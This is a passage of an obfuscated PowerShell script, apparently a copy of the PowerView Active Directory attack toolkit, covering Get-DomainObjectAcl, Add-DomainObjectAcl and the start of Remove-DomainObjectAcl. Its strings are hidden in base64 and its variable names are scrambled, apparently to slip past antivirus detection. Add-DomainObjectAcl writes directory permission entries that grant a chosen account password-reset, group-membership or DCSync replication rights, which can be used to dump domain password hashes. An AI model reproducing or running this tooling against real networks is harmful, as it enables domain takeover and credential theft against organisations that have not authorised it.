                        ${254} = ${252}.SubString(${252}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAMgA1ADQAfQAnACAAZgByAG8AbQAgACcAJAB7ADIANQAyAH0AJwA=')))
                        ${48}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${254}
                        ${31} = f74 @48
                        if (-not ${31}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewAyADUANAB9ACcA')))
                        }
                    }
                }
                elseif (${252} -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    ${253} = (([Guid]${252}).ToByteArray() | % { '\' + $_.ToString('X2') }) -join ''
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADIANQAzAH0AKQA=')))
                }
                elseif (${252}.Contains('.')) {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADIANQAyAH0AKQAoAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACgAZABuAHMAaABvAHMAdABuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQApAA==')))
                }
                else {
                    ${251} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACgAcwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAD0AJAB7ADIANQAyAH0AKQAoAG4AYQBtAGUAPQAkAHsAMgA1ADIAfQApACgAZABpAHMAcABsAGEAeQBuAGEAbQBlAD0AJAB7ADIANQAyAH0AKQApAA==')))
                }
            }
            if (${251} -and (${251}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewAyADUAMQB9ACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            if ($Filter) {
                ${31}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACQARgBpAGwAdABlAHIAKQA=')))
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $(${31}.filter)"
            ${72} = ${31}.FindAll()
            ${72} | ? {$_} | % {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    ${438} = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    ${438} = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 0 | % { if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | % {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                            ${439} = Switch ($RightsFilter) {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
                            if ($_.ObjectType -eq ${439}) {
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${438}
                                ${153} = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) ${438}
                            ${153} = $True
                        }
                        if (${153}) {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if (${430}) {
                                ${437} = @{}
                                $_.psobject.properties | % {
                                    if ($_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYwB0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                                        try {
                                            ${437}[$_.Name] = ${430}[$_.Value.toString()]
                                        }
                                        catch {
                                            ${437}[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        ${437}[$_.Name] = $_.Value
                                    }
                                }
                                ${436} = New-Object -TypeName PSObject -Property ${437}
                                ${436}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                ${436}
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAE8AYgBqAGUAYwB0AEEAYwBsAF0AIABFAHIAcgBvAHIAOgAgACQAXwA=')))
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${434},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${433} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${435} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${431} = f98 @435
        if (-not ${431}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${434}
        ${432} = f98 @433
        ForEach (${422} in ${432}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${427} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${426} = @()
            if ($RightsGUID) {
                ${430} = @($RightsGUID)
            }
            else {
                ${430} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${423} in ${431}) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${423}.distinguishedname) '$Rights' on $(${422}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${423}.objectsid)
                    if (${430}) {
                        ForEach (${364} in ${430}) {
                            ${429} = New-Object Guid ${364}
                            ${428} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${426} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${428}, ${427}, ${429}, $InheritanceType
                        }
                    }
                    else {
                        ${428} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${426} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${428}, ${427}, $InheritanceType
                    }
                    ForEach (${425} in ${426}) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${423}.distinguishedname) rights GUID '$(${425}.ObjectType)' on $(${422}.Properties.distinguishedname)"
                        ${424} = ${422}.GetDirectoryEntry()
                        ${424}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${424}.PsBase.ObjectSecurity.AddAccessRule(${425})
                        ${424}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $(${423}.distinguishedname) '$Rights' on $(${422}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Remove-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${434},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${433} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${435} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${435}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${431} = f98 @435
        if (-not ${431}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${433}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${434}
        ${432} = f98 @433
        ForEach (${422} in ${432}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${427} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${426} = @()
            if ($RightsGUID) {
                ${430} = @($RightsGUID)
            }
            else {
                ${430} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${423} in ${431}) {
